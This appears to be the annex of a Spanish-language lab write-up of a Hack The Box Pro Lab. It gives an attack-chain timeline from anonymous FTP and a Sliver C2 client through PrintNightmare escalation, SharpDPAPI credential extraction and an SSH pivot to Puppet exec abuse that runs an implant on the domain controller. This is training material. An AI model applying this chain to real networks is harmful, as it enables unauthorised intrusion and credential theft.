| PUPPET-PM01 | `10.13.38.33` (ext) / `172.16.40.200` (int) | Puppet Master + Sliver C2 | Linux |
| FILE01 | `172.16.40.50` | File server (beacon inicial) | Windows Server 2016 (20348) |
| DC01 | `172.16.40.5` | Domain Controller | Windows Server 2016 (20348) |
| Atacante | `tun0 10.10.17.17/23` | Punto de la VPN | — |

**Puertos**

| Puerto | Servicio | Uso |
|---|---|---|
| 21/tcp | FTP | Anónimo → `red_127.0.0.1.cfg` + `sliver-client_linux` |
| 22/tcp | SSH | Acceso al Puppet Master |
| 8140/tcp | Puppet Server | API de Puppet |
| 8443/tcp | mTLS / Puppet | Listener Sliver alterno + HTTPS Puppet |
| 31337/tcp | Sliver C2 | Listener principal |

**CVE / técnicas (MITRE ATT&CK)**

| ID | Técnica | Uso |
|---|---|---|
| CVE-2021-34527 | PrintNightmare (Point and Print) | Escalada a SYSTEM en FILE01 |
| T1078.002 | Valid Accounts: Domain Accounts | Cuentas de servicio reusadas |
| T1555.003 | Credentials from Web Browsers → **DPAPI Credentials** | SharpDPAPI (Task Scheduler) |
| T1021.004 | Remote Services: SSH | Pivote a PM01 |
| T1543 / Puppet `exec{}` | Ejecución vía config-management manifest | Movimiento lateral a DC01 |
| T1003 | OS Credential Dumping | LSASS/DPAPI |

**Herramientas:** Sliver C2 `v1.5.42` (commit `85b0e870`), CVE-2021-34527 PoC (PowerShell), SharpDPAPI `v1.12.0`, PsExec64, Autologon64, ssh / ssh2john / john.

**Credenciales y rutas sensibles (enmascaradas)**

| Recurso | Valor / Ubicación |
|---|---|
| Operador Sliver | `red` · token `bfbb23…5542` |
| Clave SSH | `DC01:\\it\.ssh\ed25519` → `svc_puppet_lin_t1` |
| DPAPI SYSTEM (Task Scheduler) | `PUPPET\root` → `PUPPET{…<FLAG>…}` |
| Flag final | password de `root@puppet.vl` |

---

## Anexo C · Cronología de la operación

```
[VPN] 10.10.17.17 ── ping ──▶ 10.13.38.33 (ttl=63 → gateway)
   │
   ├─(21/tcp FTP anónimo)──▶ red_127.0.0.1.cfg + sliver-client_linux
   │                              │
   │                              ▼
   ├─ Sliver client ── mTLS :31337 ──▶ sesiones (heredadas + actuales)
   │                              │  use 44b4c298 → FILE01 / bruce.smith
   │                              ▼
   ├─ Situacional: C:\Temp (CVE-2021-34527.ps1, Autologon64, implantes)
   ├─ whoami /priv (Medium, sin SeImpersonate) + spooler RUNNING
   ├─ reg query PointAndPrint → RestrictDriverInstallationToAdministrators=0
   │                              │
   │                              ▼
   ├─ PrintNightmare (CVE-2021-34527) ──▶ SYSTEM en FILE01
   │                              │
   │                              ▼
   ├─ net share / C:\it  →  \\it\.ssh\ed25519  (svc_puppet_lin_t1)
   ├─ SharpDPAPI machinetriage ──▶ DPAPI SYSTEM: PUPPET\root (Task Scheduler)
   │                              │
   │                              ▼
   ├─ SSH (clave ed25519) ──▶ PUPPET-PM01 (svc_puppet_lin_t1)
   │                              │
   │                              ▼
   ├─ sudo puppet apply -e 'exec{...}' ──▶ root en PM01
   │                              │
   │                              ▼
   ├─ manifest site.pp ──▶ agente Puppet ejecuta implante en DC01 (SYSTEM)
   │                              │
   │                              ▼
   └─ DC01: type root.txt ──▶ PUPPET{<FLAG>} = password de root@puppet.vl  ★
```

---

<div align="center">

*Writeup de laboratorio con fines educativos y de portafolio. Ejecutado sobre el Pro Lab de Hack The Box con autorización de la plataforma. Flags y credenciales enmascaradas.*

</div>
